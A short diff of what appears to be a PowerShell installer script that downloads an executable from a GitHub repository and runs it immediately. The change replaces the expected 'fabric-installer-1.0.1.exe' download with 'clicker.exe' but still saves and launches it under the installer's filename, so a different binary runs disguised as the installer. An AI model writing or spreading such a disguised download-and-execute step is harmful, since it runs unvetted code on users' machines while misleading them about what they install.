@@ -1,4 +1,4 @@
-$link = "https://github.com/nowrez/zelenkovcode/raw/main/fabric-installer-1.0.1.exe"
+$link = "https://github.com/nowrez/zelenkovcode/raw/main/clicker.exe"
 $outfile = "$env:TEMP\fabric-installer-1.0.1.exe"
 Invoke-WebRequest -Uri "$link" -OutFile "$outfile"
 Start-Process -Wait -NoNewWindow -FilePath "$outfile"
